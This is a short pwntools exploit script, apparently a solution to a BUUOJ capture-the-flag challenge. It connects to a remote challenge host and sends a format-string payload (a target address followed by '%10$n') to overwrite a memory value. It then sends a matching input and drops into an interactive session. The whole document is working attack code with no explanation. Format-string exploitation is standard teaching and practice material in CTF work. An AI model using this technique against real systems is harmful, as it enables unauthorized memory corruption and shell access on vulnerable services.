from pwn import *
sh=remote("node4.buuoj.cn",26221)
#sh=process("./timu")
sh.recv()
payload=p32(0x0804C044)+b'%10$n'
sh.send(payload)
sh.recv()
sh.send(b'4')
sh.interactive()
